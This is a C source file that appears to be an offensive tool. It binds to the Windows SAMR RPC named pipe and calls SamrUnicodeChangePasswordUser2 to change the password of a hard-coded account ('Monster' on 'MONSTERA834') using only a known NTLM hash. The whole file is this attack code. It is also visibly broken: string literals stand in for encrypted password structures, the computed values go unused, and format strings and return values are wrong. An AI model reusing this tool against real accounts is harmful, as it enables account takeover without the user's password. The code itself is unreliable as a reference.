#include <stdio.h>
#include <ntstatus.h>
#include "ms-samr.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")

#define RtlEncryptLmOwfPwdWithLmOwfPwd		SystemFunction012
NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE DataLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE EncryptedLmOwfPassword);


#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define SAM_SERVER_CONNECT 0x00000001
#define SAM_SERVER_ENUMERATE_DOMAINS 0x00000010
#define SAM_SERVER_LOOKUP_DOMAIN 0x00000020
#define DOMAIN_LOOKUP 0x00000200

#define USER_CHANGE_PASSWORD 0x00000040

#define STATUS_WRONG_PASSWORD 0xC000006A
#define STATUS_PASSWORD_RESTRICTION 0xC000006C
#define STATUS_MORE_ENTRIES 0x00000105L
NTSTATUS status = STATUS_DATA_ERROR;
BOOL StringToHex(IN LPCWCHAR string, IN LPBYTE hex, IN DWORD size)
{
	DWORD i, j;
	BOOL result = (wcslen(string) == (size * 2));
	if (result)
	{
		for (i = 0; i < size; i++)
		{
			swscanf_s(&string[i * 2], L"%02x", &j);
			hex[i] = (BYTE)j;
		}
	}
	return result;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

handle_t __RPC_USER
PSAMPR_SERVER_NAME_bind()
{
	PSAMPR_SERVER_NAME NetworkAddr = NULL;
	handle_t hBinding = NULL;
	LPWSTR pszStringBinding;
	RPC_STATUS status;
	RPC_WSTR ProtSeq = L"ncacn_np";
	RPC_WSTR Endpoint = L"\\pipe\\samr";

	status = RpcStringBindingComposeW(NULL,
		ProtSeq,
		NetworkAddr,
		Endpoint,
		NULL,
		&pszStringBinding);
	if (status)
	{
		wprintf("RpcStringBindingCompose  0x%x\n", status);
		return NULL;
	}

	/* Set the binding handle that will be used to bind to the server. */
	status = RpcBindingFromStringBindingW(pszStringBinding,
		&hBinding);
	if (status)
	{
		wprintf("RpcBindingFromStringBinding  0x%x\n", status);
	}

	status = RpcStringFreeW(&pszStringBinding);
	if (status)
	{
		wprintf("RpcStringFree  0x%x\n", status);
	}

	return hBinding;
}


void __RPC_USER
PSAMPR_SERVER_NAME_unbind()
{
	PSAMPR_SERVER_NAME pszSystemName = NULL;
	handle_t hBinding = NULL;
	RPC_STATUS status;

	status = RpcBindingFree(&hBinding);
	if (status)
	{
		wprintf("RpcBindingFree  0x%x\n", status);
	}
}

NTSTATUS __RPC_USER
PASSWORD(RPC_UNICODE_STRING* ServerName, RPC_UNICODE_STRING* UserName)
{
	int i;
	unsigned char oldNT[16];
	unsigned char newNT[16];
	//unsigned char newLM[16];

	PCWCHAR oldNTLM = L"2c0f5d06fcaee5abe033dc69c0626ce1";
	PCWCHAR newNTLM = L"2c0f5d06fcaee5abe033dc69c0626ce1";
	StringToHex(oldNTLM, oldNT, sizeof(oldNT));
	StringToHex(newNTLM, newNT, sizeof(newNT));
	ENCRYPTED_NT_OWF_PASSWORD NewPasswordEncryptedWithOldLm;
	ENCRYPTED_LM_OWF_PASSWORD OldLmOwfPasswordEncryptedWithNewNt;
	ENCRYPTED_NT_OWF_PASSWORD NewLMEncryptedWithNewNT;

	status = RtlEncryptLmOwfPwdWithLmOwfPwd(oldNT, newNT, &NewPasswordEncryptedWithOldLm);
	if (!NT_SUCCESS(status))
	{
		wprintf(L"[!] Calc OldNtEncryptedWithNewNt Error: %08X\n", status);
		exit(1);
	}
	status = RtlEncryptLmOwfPwdWithLmOwfPwd(newNT, oldNT, &OldLmOwfPasswordEncryptedWithNewNt);
	if (!NT_SUCCESS(status))
	{
		wprintf(L"[!] Calc NewNtEncryptedWithOldNt Error: %08X\n", status);
		exit(1);
	}
	PSAMPR_ENCRYPTED_USER_PASSWORD NewPasswordEncryptedWithOldNt=L"test123..";
	PENCRYPTED_NT_OWF_PASSWORD OldNtOwfPasswordEncryptedWithNewNt=L"test123..";

	status=SamrUnicodeChangePasswordUser2(
		PSAMPR_SERVER_NAME_bind(), 
		ServerName,
		UserName, 
		&NewPasswordEncryptedWithOldNt, 
		&OldNtOwfPasswordEncryptedWithNewNt,
		FALSE, 
		NULL,
		NULL
		);
	if (NT_SUCCESS(status))
	{
		wprintf(L"[*] Change password success! :)\n");
	}
	else if (status == STATUS_WRONG_PASSWORD)
	{
		wprintf(L"[!] Wrong Password!\n");
	}
	else if (status == STATUS_PASSWORD_RESTRICTION)
	{
		wprintf(L"[!] Restriction!\n");
	}
	else
	{
		wprintf(L"[!] Error Code: %08X\n", status);
	}
}

int main()
{

	wchar_t username[] = L"Monster";
	wchar_t servicenames[] = L"MONSTERA834";
	unsigned short servicenameLen = sizeof(servicenames) - 2;
	RPC_UNICODE_STRING servicename[] = { servicenameLen, 30, servicenames };

	unsigned short usernameLen = sizeof(username) - 2;
	RPC_UNICODE_STRING userName[] = { usernameLen, 30, username };

	PASSWORD(&servicename, &userName);


	return 0;
}
